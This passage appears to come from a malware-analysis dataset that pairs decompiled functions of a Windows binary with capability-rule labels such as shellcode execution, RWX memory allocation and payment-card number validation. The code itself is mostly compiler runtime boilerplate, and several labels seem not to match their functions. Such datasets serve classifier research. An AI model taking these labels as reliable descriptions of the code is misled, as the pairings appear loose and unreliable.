&stack0x00000010;\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b1ab1;\n    fcn.14001aeb0(&stack0xffffffffffffffd8 + iVar5, iVar4, arg1, &stack0x00000010);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b1abb;\n    uVar6 = fcn.1400b6600(0x10);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b1ac9;\n    fcn.14007d080(uVar6, &stack0xffffffffffffffd8 + iVar5);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b1adf;\n    piVar7 = fcn.1400b6bc0(uVar6, 0x1401056e0, 0x14007d200);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b1aea;\n    fcn.1400b6920(uVar6);\n    *(&stack0xffffffffffffffb0 + iVar5) = 0x1400b1af2;\n    arg2_00 = piVar7;\n    fcn.14000f000(piVar7);\n    *(&stack0xffffffffffffffb0 + iVar5) = &stack0xffffffffffffffe8;\n    *(&stack0xffffffffffffffa8 + iVar5) = unaff_RDI;\n    *(&stack0xffffffffffffffa0 + iVar5) = piVar7;\n    *(&stack0xffffffffffffff98 + iVar5) = uVar6;\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b1b1e;\n    fcn.1400723b0(&stack0xffffffffffffff87 + iVar5, arg2_00, 1);\n    if ((&stack0xffffffffffffff87)[iVar5] == '\\0') {\n        return arg2_00;\n    }\n    arg1_00 = &stack0xffffffffffffff88 + iVar5;\n    iVar4 = *(*arg2_00 + -0x18);\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b1b56;\n    fcn.14009fa10(arg1_00, arg2_00 + iVar4 + 0xd0);\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b1b5e;\n    iVar4 = fcn.1400b36a0(arg1_00);\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b1b69;\n    fcn.14009fb20(arg1_00);\n    piVar7 = *(arg2_00 + *(*arg2_00 + -0x18) + 0xe8);\n    puVar8 = piVar7[2];\n    if (puVar8 < piVar7[3]) goto code_r0x0001400b1b95;\ncode_r0x0001400b1bd0:\n    pcVar2 = *(*piVar7 + 0x48);\n    *(&stack0xffffffffffffff58 + iVar5) = 0x1400b1bd9;\n    uVar9 = (*pcVar2)(piVar7);\n    if (uVar9 == -1) {\ncode_r0x0001400b1bde:\n        iVar4 = *(*arg2_00 + -0x18) + arg2_00;\n        uVar1 = *(iVar4 + 0x20);\n        *(&stack0xffffffffffffff58 + iVar5) = 0x1400b1bf3;\n        fcn.1400ae9f0(iVar4, uVar1 | 2);\n        return arg2_00;\n    }\n    do {\n        if ((*(*(iVar4 + 0x30) + (uVar9 & 0xff) * 2) & 0x20) == 0) {\n            return arg2_00;\n        }\n        if (piVar7[2] < piVar7[3]) {\n            puVar8 = piVar7[2] + 1;\n            piVar7[2] = puVar8;\n            if (piVar7[3] <= puVar8) goto code_r0x0001400b1bd0;\n        }\n        else {\n            pcVar2 = *(*piVar7 + 0x50);\n            *(&stack0xffffffffffffff58 + iVar5) = 0x1400b1bbb;\n            iVar3 = (*pcVar2)(piVar7);\n            if (iVar3 == -1) goto code_r0x0001400b1bde;\n            puVar8 = piVar7[2];\n            if (piVar7[3] <= puVar8) goto code_r0x0001400b1bd0;\n        }\ncode_r0x0001400b1b95:\n        uVar9 = *puVar8;\n    } while( true );\n}\n",
        "token_count": 1469
    },
    "1400b634": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400b6340(int64_t *arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    \n    iVar2 = *arg1;\n    *(iVar2 + 0x60) = 0;\n    *(iVar2 + 0x98) = 0;\n    if (*(iVar2 + 0x80) != '\\0') {\n        if (*(iVar2 + 0x70) != 0) {\n            fcn.1400b64c0();\n        }\n        *(iVar2 + 0x70) = 0;\n        *(iVar2 + 0x80) = 0;\n    }\n    if (*(iVar2 + 0xa8) != 0) {\n        fcn.1400b64c0();\n    }\n    iVar3 = *arg1;\n    *(iVar2 + 0xa8) = 0;\n    *(iVar2 + 0xb8) = 0x0;\n    uVar4 = *(iVar3 + 0x70);\n    uVar1 = *(iVar3 + 100);\n    *(iVar2 + 0xb0) = 0;\n    *(iVar3 + 0x20) = 0x0;\n    *(iVar3 + 0x18) = uVar4;\n    *(iVar3 + 0x30) = 0;\n    *(iVar3 + 0x81) = 0;\n    *(iVar3 + 8) = uVar4;\n    *(iVar3 + 0x10) = uVar4;\n    *(iVar3 + 0x68) = CONCAT44(uVar1, uVar1);\n    return;\n}\n",
        "token_count": 375
    },
    "1400b640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400b6400(int64_t *arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    \n    iVar2 = *arg1;\n    *(iVar2 + 0x60) = 0;\n    *(iVar2 + 0x98) = 0;\n    if (*(iVar2 + 0x80) != '\\0') {\n        if (*(iVar2 + 0x70) != 0) {\n            fcn.1400b64c0();\n        }\n        *(iVar2 + 0x70) = 0;\n        *(iVar2 + 0x80) = 0;\n    }\n    if (*(iVar2 + 0xa8) != 0) {\n        fcn.1400b64c0();\n    }\n    iVar3 = *arg1;\n    *(iVar2 + 0xa8) = 0;\n    *(iVar2 + 0xb8) = 0x0;\n    uVar4 = *(iVar3 + 0x70);\n    uVar1 = *(iVar3 + 100);\n    *(iVar2 + 0xb0) = 0;\n    *(iVar3 + 0x20) = 0x0;\n    *(iVar3 + 0x18) = uVar4;\n    *(iVar3 + 0x30) = 0;\n    *(iVar3 + 0x81) = 0;\n    *(iVar3 + 8) = uVar4;\n    *(iVar3 + 0x10) = uVar4;\n    *(iVar3 + 0x68) = CONCAT44(uVar1, uVar1);\n    return;\n}\n",
        "token_count": 375
    },
    "1400b667": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.1400b6670(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong arg2;\n    ulong uVar2;\n    char cVar3;\n    int64_t **ppiVar4;\n    ulong arg1_00;\n    int64_t *piVar5;\n    int64_t arg1_01;\n    ulong *puVar6;\n    uchar auStack168 [16];\n    ulong uStack152;\n    int64_t *piStack120;\n    \n    ppiVar4 = fcn.1400b6970();\n    piVar5 = arg1 + -10;\n    piStack120 = *ppiVar4;\n    if (*arg1 + 0xb8b1aabcbcd4d500U < 2) {\n        iVar1 = *(arg1 + -5);\n        if (iVar1 < 0) {\n            iVar1 = -iVar1;\n        }\n        *(arg1 + -5) = iVar1 + 1;\n        *(ppiVar4 + 1) = *(ppiVar4 + 1) + -1;\n        if (piStack120 != piVar5) {\n            arg1[-6] = piStack120;\n            *ppiVar4 = piVar5;\n        }\n        return arg1[-1];\n    }\n    if (piStack120 == NULL) {\n        *ppiVar4 = piVar5;\n        return 0;\n    }\n    fcn.1400b2e40();\n    if (piStack120 != NULL) {\n        fcn.1400b6670(piStack120);\n        if (*piStack120 + 0xb8b1aabcbcd4d500U < 2) goto code_r0x0001400b671a;\n    }\n    fcn.1400b2e40();\ncode_r0x0001400b671a:\n    arg1_01 = piStack120[-7];\n    fcn.140019910();\n    fcn.1400b6670(arg1_01);\n    uStack152 = *(arg1_01 + -0x10);\n    arg2 = *(arg1_01 + -0x18);\n    iVar1 = *(arg1_01 + -0x24);\n    uVar2 = *(arg1_01 + -0x38);\n    arg1_00 = fcn.140019930(*(arg1_01 + -0x40));\n    fcn.1400b6670(arg1_00);\n    piVar5 = fcn.1400b6980();\n    puVar6 = *piVar5;\n    if ((*(puVar6 + 10) & 1) == 0) goto code_r0x0001400b67ea;\n    puVar6 = *puVar6;\n    while( true ) {\n        fcn.140019500(0, arg2, auStack168);\n        cVar3 = fcn.1400195f0(auStack168, puVar6[-0x12], puVar6, iVar1);\n        if (cVar3 != '\\0') break;\n        puVar6 = 0x140105740;\n        cVar3 = fcn.1400195f0(auStack168, 0x140105740, 0, iVar1);\n        if (cVar3 == '\\0') goto code_r0x0001400b680d;\n        piVar5 = fcn.1400b6600(8);\n        *piVar5 = *0x1401032a0 + 0x10;\n        fcn.1400b6bc0(piVar5, 0x140105740, 0x140083310);\ncode_r0x0001400b67ea:\n        puVar6 = puVar6 + 0x12;\n    }\n    fcn.1400b6b70();\ncode_r0x0001400b680d:\n    fcn.140019910(uVar2);\n    ppiVar4 = fcn.1400b6970();\n    piVar5 = *ppiVar4;\n    if (piVar5 != NULL) {\n        if ((*(piVar5 + 10) & 1) != 0) {\n            piVar5 = *piVar5 + -0x90;\n        }\n        piVar5 = *piVar5;\n    }\n    return piVar5;\n}\n",
        "token_count": 948
    },
    "1400b66f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b66f0(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong arg2;\n    ulong uVar2;\n    char cVar3;\n    ulong arg1_00;\n    int64_t *piVar4;\n    int64_t **ppiVar5;\n    int64_t arg1_01;\n    ulong *puVar6;\n    uchar auStack128 [16];\n    ulong uStack112;\n    int64_t *piStack80;\n    \n    if (arg1 != NULL) {\n        fcn.1400b6670(arg1);\n        if (*arg1 + 0xb8b1aabcbcd4d500U < 2) goto code_r0x0001400b671a;\n    }\n    fcn.1400b2e40();\ncode_r0x0001400b671a:\n    arg1_01 = arg1[-7];\n    fcn.140019910();\n    piStack80 = arg1;\n    fcn.1400b6670(arg1_01);\n    uStack112 = *(arg1_01 + -0x10);\n    arg2 = *(arg1_01 + -0x18);\n    iVar1 = *(arg1_01 + -0x24);\n    uVar2 = *(arg1_01 + -0x38);\n    arg1_00 = fcn.140019930(*(arg1_01 + -0x40));\n    fcn.1400b6670(arg1_00);\n    piVar4 = fcn.1400b6980();\n    puVar6 = *piVar4;\n    if ((*(puVar6 + 10) & 1) == 0) goto code_r0x0001400b67ea;\n    puVar6 = *puVar6;\n    while( true ) {\n        fcn.140019500(0, arg2, auStack128);\n        cVar3 = fcn.1400195f0(auStack128, puVar6[-0x12], puVar6, iVar1);\n        if (cVar3 != '\\0') break;\n        puVar6 = 0x140105740;\n        cVar3 = fcn.1400195f0(auStack128, 0x140105740, 0, iVar1);\n        if (cVar3 == '\\0') goto code_r0x0001400b680d;\n        piVar4 = fcn.1400b6600(8);\n        *piVar4 = *0x1401032a0 + 0x10;\n        fcn.1400b6bc0(piVar4, 0x140105740, 0x140083310);\ncode_r0x0001400b67ea:\n        puVar6 = puVar6 + 0x12;\n    }\n    fcn.1400b6b70();\ncode_r0x0001400b680d:\n    fcn.140019910(uVar2);\n    ppiVar5 = fcn.1400b6970();\n    piVar4 = *ppiVar5;\n    if (piVar4 != NULL) {\n        if ((*(piVar4 + 10) & 1) != 0) {\n            piVar4 = *piVar4 + -0x90;\n        }\n        piVar4 = *piVar4;\n    }\n    return piVar4;\n}\n",
        "token_count": 744
    },
    "1400b685": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400b6850(void)\n\n{\n    uint64_t *puVar1;\n    uint64_t arg1;\n    int32_t iVar2;\n    \n    puVar1 = fcn.1400b6980();\n    arg1 = *puVar1;\n    if (arg1 != 0) {\n        if (1 < *(arg1 + 0x50) + 0xb8b1aabcbcd4d500U) {\n            *puVar1 = 0;\ncode_r0x00014000f100:\n            if (*(arg1 + 0x58) != NULL) {\n    // WARNING: Could not recover jumptable at 0x00014000f111. Too many branches\n    // WARNING: Treating indirect jump as call\n                (**(arg1 + 0x58))(1, arg1 + 0x50);\n                return;\n            }\n            return;\n        }\n        iVar2 = *(arg1 + 0x28);\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + 1;\n            if (iVar2 == 0) {\n                *puVar1 = *(arg1 + 0x20);\n            }\n        }\n        else {\n            iVar2 = iVar2 + -1;\n            if (iVar2 == 0) {\n                *puVar1 = *(arg1 + 0x20);\n                goto code_r0x00014000f100;\n            }\n            if (iVar2 == -1) {\n                fcn.1400b2e40();\n                if ((*0x1400f9b78 < arg1) && (arg1 < *0x1400f9b78 + *0x1400f9b80)) {\n                    fcn.14001a1b0(arg1);\n                    return;\n                }\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n                (*_sym.imp.msvcrt.dll_free)();\n                return;\n            }\n        }\n        *(arg1 + 0x28) = iVar2;\n    }\n    return;\n}\n",
        "token_count": 468
    },
    "1400b69d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b69d0(char *arg1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong *arg1_00;\n    uchar *arg1_01;\n    ulong uVar4;\n    int64_t iVar5;\n    uint64_t in_RDX;\n    ulong in_R8;\n    \n    puVar1 = *0x140102a70;\n    if (*arg1 == '\\0') {\n        uVar3 = **0x140102a70;\n        if (**0x140102a70 == 0) {\n            if (*arg1 == '\\0') {\n                if (arg1[1] != '\\0') {\ncode_r0x0001400b6a9c:\n                    arg1_01 = fcn.1400b76a0();\n                    if (*puVar1 != 0) {\n                        iVar2 = fcn.14000ebe0(*0x1400fabe0);\n                        if (iVar2 != 0) {\n                            fcn.14001bf30();\n                        }\n                    }\n                    fcn.14000f000(arg1_01);\n                    arg1_01[1] = 0;\n                    *arg1_01 = 1;\n                    uVar3 = **0x140102a70;\n                    if (**0x140102a70 != 0) {\n                        iVar5 = *0x1400fabe0;\n                        uVar3 = fcn.14000ebe0(*0x1400fabe0);\n                        if (uVar3 != 0) {\n                            fcn.14001bf30();\n                            *(iVar5 + -0xa0) = 0;\n                            *(iVar5 + -0x90) = in_RDX;\n                            *(iVar5 + -0x88) = in_R8;\n                            uVar4 = fcn.1400b05a0();\n                            *(iVar5 + -0x80) = uVar4;\n                            uVar4 = fcn.1400affd0();\n                            *(iVar5 + -0x78) = uVar4;\n                            *(iVar5 + -0x40) = 0x474e5543432b2b00;\n                            *(iVar5 + -0x38) = 0x140019770;\n                            return iVar5 - 0xa0;\n                        }\n                    }\n                    return uVar3;\n                }\ncode_r0x0001400b6a00:\n                arg1[1] = '\\x01';\n                uVar3 = 1;\n            }\n            return uVar3;\n        }\n        fcn.14000e8c0(0x1400fc330, 0x14001a4f0);\n        in_RDX = *puVar1;\n        iVar5 = *0x1400fabe0;\n        if (*puVar1 != 0) goto code_r0x0001400b6a40;\n        if (*arg1 == '\\0') {\n            do {\n                if (arg1[1] == '\\0') goto code_r0x0001400b6a00;\n                fcn.1400b76a0();\ncode_r0x0001400b6a40:\n                iVar2 = fcn.14000eb20(iVar5);\n                if (iVar2 != 0) {\n                    arg1_00 = fcn.1400b6600(8);\n                    in_R8 = 0x14001bb60;\n                    in_RDX = 0x1401046c0;\n                    *arg1_00 = 0x1401090f0;\n                    fcn.1400b6bc0(arg1_00, 0x1401046c0, 0x14001bb60);\n                    goto code_r0x0001400b6a97;\n                }\n            } while (*arg1 == '\\0');\n            if (*puVar1 != 0) {\n                iVar2 = fcn.14000ebe0(*0x1400fabe0);\n                if (iVar2 != 0) {\ncode_r0x0001400b6a97:\n                    fcn.14001bf30();\n                    goto code_r0x0001400b6a9c;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 939
    },
    "1400b6b7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400b6b70(void)\n\n{\n    int64_t *piVar1;\n    int64_t arg1;\n    \n    piVar1 = fcn.1400b6970();\n    arg1 = *piVar1;\n    *(piVar1 + 1) = *(piVar1 + 1) + 1;\n    if (arg1 == 0) goto code_r0x0001400b6bb3;\n    if (*(arg1 + 0x50) + 0xb8b1aabcbcd4d500U < 2) goto code_r0x0001400b6bb8;\n    *piVar1 = 0;\n    do {\n        arg1 = arg1 + 0x50;\n        fcn.14000f0b0(arg1);\n        fcn.1400b6670(arg1);\ncode_r0x0001400b6bb3:\n        fcn.1400b2e40();\ncode_r0x0001400b6bb8:\n        *(arg1 + 0x28) = -*(arg1 + 0x28);\n    } while( true );\n}\n",
        "token_count": 252
    },
    "1400b721": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400b7210(ulong arg1)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    \n    uVar1 = fcn.1400b6600(0x10);\n    fcn.14008fdf0(uVar1, arg1);\n    uVar2 = fcn.1400b6bc0(uVar1, 0x140105850, fcn.14008ffc0);\n    fcn.1400b6920(uVar1);\n    fcn.14000f000(uVar2);\n    uVar1 = fcn.1400b6600(0x10);\n    fcn.14007af40(uVar1, uVar2);\n    uVar2 = fcn.1400b6bc0(uVar1, 0x140105630, 0x14007b0c0);\n    fcn.1400b6920(uVar1);\n    fcn.14000f000(uVar2);\n    uVar1 = fcn.1400b6600(0x10);\n    fcn.140095120(uVar1, uVar2);\n    uVar2 = fcn.1400b6bc0(uVar1, 0x1401059b0, 0x1400952a0);\n    fcn.1400b6920(uVar1);\n    fcn.14000f000(uVar2);\n    uVar1 = fcn.1400b6600(0x10);\n    fcn.140097680(uVar1, uVar2);\n    uVar2 = fcn.1400b6bc0(uVar1, 0x140105af0, 0x140097800);\n    fcn.1400b6920(uVar1);\n    fcn.14000f000(uVar2);\n    if (*0x1400f9760 == '\\0') {\n        *0x1400f9760 = '\\x01';\n    }\n    if (*0x1400f9780 == '\\0') {\n        *0x1400f9780 = '\\x01';\n    }\n    if (*0x1400f9820 == '\\0') {\n        *0x1400f9820 = '\\x01';\n    }\n    if (*0x1400f9840 == '\\0') {\n        *0x1400f9840 = '\\x01';\n    }\n    if (*0x1400f95e0 == '\\0') {\n        *0x1400f95e0 = '\\x01';\n    }\n    if (*0x1400f95f0 == '\\0') {\n        *0x1400f95f0 = '\\x01';\n    }\n    if (*0x1400f97c0 == '\\0') {\n        *0x1400f97c0 = '\\x01';\n    }\n    if (*0x1400f9620 == '\\0') {\n        *0x1400f9620 = '\\x01';\n    }\n    if (*0x1400f9800 == '\\0') {\n        *0x1400f9800 = '\\x01';\n    }\n    if (*0x1400f97e0 == '\\0') {\n        *0x1400f97e0 = '\\x01';\n    }\n    if (*0x1400f97a0 == '\\0') {\n        *0x1400f97a0 = '\\x01';\n    }\n    if (*0x1400f9740 == '\\0') {\n        *0x1400f9740 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 785
    },
    "14000c17": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.14000c170(int64_t arg1, ulong noname_1, int64_t *arg3, ulong arg4)\n\n{\n    uchar uVar1;\n    char cVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    ulong uVar5;\n    ulong arg3_00;\n    int64_t iVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t *piVar11;\n    uchar *puVar12;\n    uchar auStack88 [40];\n    \n    iVar8 = arg4;\n    if (arg3 != NULL) {\n        do {\n            if (*(arg1 + 0x130) != 0) {\n                return;\n            }\n            if (*(arg3 + 2) == 0) {\n                piVar11 = arg3[1];\n                iVar3 = *piVar11;\n                if (iVar8 == 0) {\n                    if (iVar3 - 0x1cU < 0x36) {\n                        if ((0x3400000000001fU >> (iVar3 - 0x1cU & 0x3f) & 1) != 0) goto code_r0x00014000c1ea;\n                        goto code_r0x00014000c1a6;\n                    }\n                    *(arg3 + 2) = 1;\n                    uVar4 = *(arg1 + 0x120);\n                    *(arg1 + 0x120) = arg3[3];\n                }\n                else {\ncode_r0x00014000c1a6:\n                    *(arg3 + 2) = 1;\n                    uVar4 = *(arg1 + 0x120);\n                    *(arg1 + 0x120) = arg3[3];\n                    if (iVar3 == 0x29) {\n                        fcn.14000be50(arg1, 0x11, piVar11, *arg3);\n                        *(arg1 + 0x120) = uVar4;\n                        return;\n                    }\n                    if (iVar3 == 0x2a) {\n                        fcn.14000c4f0(arg1, 0x11, piVar11, *arg3);\n                        *(arg1 + 0x120) = uVar4;\n                        return;\n                    }\n                }\n                if (iVar3 == 2) {\n                    uVar5 = *(arg1 + 0x128);\n                    arg3_00 = *(piVar11 + 4);\n                    *(arg1 + 0x128) = 0;\n                    fcn.14000b4c0(arg1, 0x11, arg3_00);\n                    *(arg1 + 0x128) = uVar5;\n                    puVar10 = 0x1400ff485;\n                    iVar7 = *(arg1 + 0x100);\n                    do {\n                        uVar1 = *puVar10;\n                        if (iVar7 == 0xff) {\n                            *(arg1 + 0xff) = 0;\n                            (**(arg1 + 0x110))(arg1);\n                            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                            iVar6 = 1;\n                            iVar7 = 0;\n                        }\n                        else {\n                            iVar6 = iVar7 + 1;\n                        }\n                        puVar10 = puVar10 + 1;\n                        *(arg1 + 0x100) = iVar6;\n                        *(arg1 + iVar7) = uVar1;\n                        *(arg1 + 0x108) = uVar1;\n                        iVar7 = iVar6;\n                    } while (puVar10 != 0x1400ff487);\n                    piVar11 = *(arg3[1] + 0x18);\n                    iVar8 = *piVar11;\n                    if (iVar8 == 0x48) {\n                        pcVar9 = \"{default arg#\";\n                        do {\n                            cVar2 = *pcVar9;\n                            if (iVar6 == 0xff) {\n                                *(arg1 + 0xff) = 0;\n                                (**(arg1 + 0x110))(arg1);\n                                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                iVar7 = 1;\n                                iVar6 = 0;\n                            }\n                            else {\n                                iVar7 = iVar6 + 1;\n                            }\n                            pcVar9 = pcVar9 + 1;\n                            *(arg1 + 0x100) = iVar7;\n                            *(arg1 + iVar6) = cVar2;\n                            *(arg1 + 0x108) = cVar2;\n                            iVar6 = iVar7;\n                        } while (pcVar9 != \"\");\n                        puVar10 = auStack88;\n                        fcn.140004c90(puVar10, 0x1400ff08c, piVar11[6] + 1, arg4);\n                        iVar6 = sub.msvcrt.dll_strlen(puVar10);\n                        iVar7 = *(arg1 + 0x100);\n                        if (iVar6 != 0) {\n                            puVar12 = puVar10 + iVar6;\n                            iVar6 = iVar7;\n                            do {\n                                uVar1 = *puVar10;\n                                if (iVar6 == 0xff) {\n                                    *(arg1 + 0xff) = 0;\n                                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                    iVar7 = 1;\n                                    iVar6 = 0;\n                                }\n                                else {\n                                    iVar7 = iVar6 + 1;\n                                }\n                                puVar10 = puVar10 + 1;\n                                *(arg1 + 0x100) = iVar7;\n                                *(arg1 + iVar6) = uVar1;\n                                *(arg1 + 0x108) = uVar1;\n                                iVar6 = iVar7;\n                            } while (puVar10 != puVar12);\n                        }\n                        puVar10 = 0x1400ff496;\n                        do {\n                            uVar1 = *puVar10;\n                            if (iVar7 == 0xff) {\n                                *(arg1 + 0xff) = 0;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                iVar6 = 1;\n                                iVar7 = 0;\n                            }\n                            else {\n                                iVar6 = iVar7 + 1;\n                            }\n                            puVar10 = puVar10 + 1;\n                            *(arg1 + 0x100) = iVar6;\n                            *(arg1 + iVar7) = uVar1;\n                            *(arg1 + 0x108) = uVar1;\n                            iVar7 = iVar6;\n                        } while (puVar10 != 0x1400ff499);\n                        piVar11 = *(piVar11 + 4);\n                        iVar8 = *piVar11;\n                    }\n                    while ((iVar8 - 0x1cU < 0x36 && ((0x3400000000001fU >> (iVar8 - 0x1cU & 0x3f) & 1) != 0))) {\n                        piVar11 = *(piVar11 + 4);\n                        iVar8 = *piVar11;\n                    }\n                    fcn.14000b4c0(arg1, 0x11, piVar11);\n                    *(arg1 + 0x120) = uVar4;\n                    return;\n                }\n                fcn.14000b560(arg1, 0x11, piVar11);\n                *(arg1 + 0x120) = uVar4;\n            }\ncode_r0x00014000c1ea:\n            arg3 = *arg3;\n        } while (arg3 != NULL);\n    }\n    return;\n}\n",
        "token_count": 1760
    },
    "14000db5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.14000db50(uint8_t **arg1)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint8_t **ppuVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    int32_t *piVar13;\n    uint uVar14;\n    char *arg1_00;\n    uint32_t uVar15;\n    uint64_t arg2;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    int64_t iVar18;\n    uint8_t *puVar19;\n    uint8_t **arg1_01;\n    uint8_t **in_R8;\n    uint32_t uVar20;\n    uint8_t **in_R9;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    ulong auStack336 [5];\n    uint auStack296 [2];\n    uint64_t uStack288;\n    uchar auStack280 [16];\n    ulong auStack264 [7];\n    uint8_t *apuStack208 [2];\n    uchar auStack192 [12];\n    uchar auStack180 [12];\n    uint8_t **ppuStack168;\n    int64_t iStack160;\n    int64_t iStack152;\n    uint8_t *apuStack72 [3];\n    uint8_t *puStack48;\n    int32_t iStack36;\n    \n    iStack160 = *0x1401290c4;\n    if (*0x1401290c4 < 1) goto code_r0x00014000dc80;\n    in_R9 = NULL;\n    ppuVar10 = *0x1401290c8 + 0x18;\n    do {\n        in_R8 = *ppuVar10;\n        if ((in_R8 <= arg1) && (in_R8 = in_R8 + *(ppuVar10[1] + 8),  arg1 < in_R8)) {\n            return;\n        }\n        uVar20 = in_R9 + 1;\n        in_R9 = uVar20;\n        ppuVar10 = ppuVar10 + 5;\n    } while (uVar20 != *0x1401290c4);\n    while (iStack152 = fcn.14000e5a0(arg1),  iStack152 != 0) {\n        arg1 = iStack160 * 0x28;\n        puVar11 = *0x1401290c8 + arg1;\n        *(puVar11 + 8) = iStack152;\n        *puVar11 = 0;\n        iVar12 = fcn.14000e6e0();\n        iVar12 = iVar12 + *(iStack152 + 0xc);\n        *(*0x1401290c8 + 0x18 + arg1) = iVar12;\n        iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar12, apuStack72, 0x30);\n        if (iVar12 == 0) {\n            in_R8 = *(*0x1401290c8 + 0x18 + arg1);\n            fcn.14000dae0(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack152 + 8), in_R8, in_R9);\n            break;\n        }\n        if (((iStack36 - 0x40U & 0xffffffbf) == 0) || ((iStack36 - 4U & 0xfffffffb) == 0)) {\ncode_r0x00014000dc1e:\n            *0x1401290c4 = *0x1401290c4 + 1;\n            return;\n        }\n        in_R8 = 0x40;\n        if (iStack36 == 2) {\n            in_R8 = 0x4;\n        }\n        arg1 = arg1 + *0x1401290c8;\n        arg1[1] = apuStack72[0];\n        arg1[2] = puStack48;\n        in_R9 = arg1;\n        iVar9 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar9 != 0) goto code_r0x00014000dc1e;\n        uVar20 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.14000dae0(\"  VirtualProtect failed with code 0x%x\", uVar20, in_R8, in_R9);\ncode_r0x00014000dc80:\n        iStack160 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.14000dae0(\"Address %p has no image-section\", arg1, in_R8, in_R9);\n    iVar9 = *0x1401290c0;\n    if (*0x1401290c0 != 0) {\n        return;\n    }\n    *0x1401290c0 = 1;\n    auStack264[2] = 0x14000dd07;\n    